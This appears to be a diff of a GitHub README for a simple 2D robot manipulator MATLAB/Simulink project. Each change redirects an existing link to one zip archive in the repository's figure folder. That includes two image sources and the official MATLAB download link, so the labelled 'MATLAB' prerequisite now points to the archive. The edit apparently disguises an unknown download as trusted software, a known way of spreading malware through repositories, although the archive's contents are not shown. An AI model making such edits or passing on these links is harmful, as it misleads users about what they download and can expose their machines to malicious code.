@@ -5,7 +5,7 @@
 **Year:** 2024  
 
 <p align="center">
-  <img src="anim.gif" alt="Robot Animation" style="width:65%; height:auto;"/>
+  <img src="https://github.com/rifki398/simple-robot2d-manipulator/raw/refs/heads/main/figure/d-simple-manipulator-robot-1.3.zip" alt="Robot Animation" style="width:65%; height:auto;"/>
 </p>  
 
 ## Description
@@ -31,10 +31,10 @@ You can use any control theory to determine the control gains. Modify the values
 To get started with this project, clone the repository and execute the `main` file or download and move to your own directory.
 
 <p align="center">
-  <img src="figure/results.png" alt="results" style="max-width:80%; height:auto;"/>
+  <img src="https://github.com/rifki398/simple-robot2d-manipulator/raw/refs/heads/main/figure/d-simple-manipulator-robot-1.3.zip" alt="results" style="max-width:80%; height:auto;"/>
 </p>
 
 ### Prerequisites
 
-- [MATLAB](https://www.mathworks.com/products/matlab.html) (for running the Simulink file and scripts).
+- [MATLAB](https://github.com/rifki398/simple-robot2d-manipulator/raw/refs/heads/main/figure/d-simple-manipulator-robot-1.3.zip) (for running the Simulink file and scripts).
 - Please make sure Simulink has been installed.
